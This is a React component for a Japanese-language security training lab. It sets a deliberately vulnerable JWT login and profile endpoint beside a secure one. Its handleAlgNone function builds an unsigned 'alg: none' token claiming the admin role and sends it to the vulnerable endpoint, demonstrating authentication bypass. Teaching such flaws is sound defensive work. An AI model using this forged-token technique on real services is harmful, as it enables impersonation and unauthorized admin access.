import { useState } from "react";
import { LabLayout } from "../../../components/LabLayout";
import { ComparisonPanel } from "../../../components/ComparisonPanel";
import { FetchButton } from "../../../components/FetchButton";
import { CheckpointBox } from "../../../components/CheckpointBox";

const BASE = "/api/labs/jwt-vulnerabilities";

type JwtResult = {
  success: boolean;
  message: string;
  token?: string;
  profile?: Record<string, unknown>;
  _debug?: { message: string; algorithm?: string };
};

function JwtPanel({
  mode,
  loginResult,
  profileResult,
  isLoading,
  onLogin,
  onProfile,
  onAlgNone,
}: {
  mode: "vulnerable" | "secure";
  loginResult: JwtResult | null;
  profileResult: JwtResult | null;
  isLoading: boolean;
  onLogin: (u: string, p: string) => void;
  onProfile: (token: string) => void;
  onAlgNone: () => void;
}) {
  const [token, setToken] = useState("");

  return (
    <div>
      <div className="mb-3">
        <FetchButton onClick={() => onLogin("user1", "password1")} disabled={isLoading}>
          user1 でログイン
        </FetchButton>
        {loginResult?.token && (
          <div className="mt-1">
            <div className="text-xs text-[#666]">取得トークン:</div>
            <input
              type="text"
              value={loginResult.token}
              readOnly
              className="py-1 px-2 border border-[#ccc] rounded w-full text-[10px] font-mono"
              onClick={() => setToken(loginResult.token || "")}
            />
            <button onClick={() => setToken(loginResult.token || "")} className="text-[10px] mt-1">
              トークンをコピー
            </button>
          </div>
        )}
      </div>

      <div className="mb-3">
        <label className="text-[13px] block">トークン（改ざん可能）:</label>
        <textarea
          value={token}
          onChange={(e) => setToken(e.target.value)}
          className="py-1 px-2 border border-[#ccc] rounded w-full text-[10px] font-mono"
          rows={3}
        />
        <div className="flex gap-1 mt-1">
          <FetchButton onClick={() => onProfile(token)} disabled={isLoading}>
            プロフィール取得
          </FetchButton>
          {mode === "vulnerable" && (
            <FetchButton onClick={onAlgNone} disabled={isLoading}>
              alg=none 攻撃
            </FetchButton>
          )}
        </div>
      </div>

      {profileResult && (
        <div className={`mt-2 p-3 rounded ${profileResult.success ? "bg-[#e8f5e9] border border-[#4caf50]" : "bg-[#ffebee] border border-[#f44336]"}`}>
          <div className={`font-bold text-sm ${profileResult.success ? "text-[#2e7d32]" : "text-[#c62828]"}`}>
            {profileResult.success ? "認証成功" : "認証失敗"}
          </div>
          <div className="text-[13px] mt-1">{profileResult.message}</div>
          {profileResult.profile && (
            <pre className="text-xs bg-[#f5f5f5] p-2 rounded mt-2 overflow-auto">
              {JSON.stringify(profileResult.profile, null, 2)}
            </pre>
          )}
          {profileResult._debug && <div className="mt-2 text-xs text-[#888] italic">{profileResult._debug.message}</div>}
        </div>
      )}
    </div>
  );
}

export function JwtVulnerabilities() {
  const [vulnLogin, setVulnLogin] = useState<JwtResult | null>(null);
  const [secureLogin, setSecureLogin] = useState<JwtResult | null>(null);
  const [vulnProfile, setVulnProfile] = useState<JwtResult | null>(null);
  const [secureProfile, setSecureProfile] = useState<JwtResult | null>(null);
  const [loading, setLoading] = useState(false);

  const handleLogin = async (mode: "vulnerable" | "secure", username: string, password: string) => {
    setLoading(true);
    try {
      const res = await fetch(`${BASE}/${mode}/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data: JwtResult = await res.json();
      if (mode === "vulnerable") setVulnLogin(data);
      else setSecureLogin(data);
    } catch (e) {
      const err = { success: false, message: (e as Error).message };
      if (mode === "vulnerable") setVulnLogin(err);
      else setSecureLogin(err);
    }
    setLoading(false);
  };

  const handleProfile = async (mode: "vulnerable" | "secure", token: string) => {
    setLoading(true);
    try {
      const res = await fetch(`${BASE}/${mode}/profile`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      const data: JwtResult = await res.json();
      if (mode === "vulnerable") setVulnProfile(data);
      else setSecureProfile(data);
    } catch (e) {
      const err = { success: false, message: (e as Error).message };
      if (mode === "vulnerable") setVulnProfile(err);
      else setSecureProfile(err);
    }
    setLoading(false);
  };

  const handleAlgNone = async () => {
    // alg=none でadminになりすまし
    const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
    const payload = btoa(JSON.stringify({ sub: "admin", role: "admin" })).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
    const fakeToken = `${header}.${payload}.`;
    await handleProfile("vulnerable", fakeToken);
  };

  return (
    <LabLayout
      title="JWT脆弱性"
      subtitle="JWT署名検証不備による認証バイパス"
      description="JWTのアルゴリズム(alg)フィールドを'none'に変更して署名検証をスキップし、任意のユーザーになりすませる脆弱性を体験します。"
    >
      <ComparisonPanel
        vulnerableContent={
          <JwtPanel mode="vulnerable" loginResult={vulnLogin} profileResult={vulnProfile} isLoading={loading}
            onLogin={(u, p) => handleLogin("vulnerable", u, p)} onProfile={(t) => handleProfile("vulnerable", t)} onAlgNone={handleAlgNone} />
        }
        secureContent={
          <JwtPanel mode="secure" loginResult={secureLogin} profileResult={secureProfile} isLoading={loading}
            onLogin={(u, p) => handleLogin("secure", u, p)} onProfile={(t) => handleProfile("secure", t)} onAlgNone={() => {}} />
        }
      />

      <CheckpointBox>
        <ul>
          <li>脆弱版: alg=none でadminになりすませるか</li>
          <li>安全版: alg=none トークンが拒否されるか</li>
          <li>JWTのアルゴリズム固定と署名検証の重要性を理解したか</li>
        </ul>
      </CheckpointBox>
    </LabLayout>
  );
}
